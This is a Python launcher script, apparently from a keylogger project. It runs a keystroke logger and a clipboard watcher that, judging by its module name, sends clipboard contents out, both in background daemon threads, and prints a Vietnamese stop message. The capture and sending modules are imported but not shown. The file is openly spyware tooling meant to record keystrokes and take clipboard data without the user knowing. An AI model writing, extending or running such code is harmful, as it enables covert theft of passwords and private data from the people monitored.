import threading
from src import key_logger
from src import send_clipboard

def run_keylogger():
    key_logger.main()

def run_clipboard_watcher():
    send_clipboard.watchdog_loop(interval=2.0)

if __name__ == '__main__':
    keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
    clipboard_thread = threading.Thread(target=run_clipboard_watcher, daemon=True)

    keylogger_thread.start()
    clipboard_thread.start()

    try:
        keylogger_thread.join()
        clipboard_thread.join()
    except KeyboardInterrupt:
        print("Dừng chương trình...")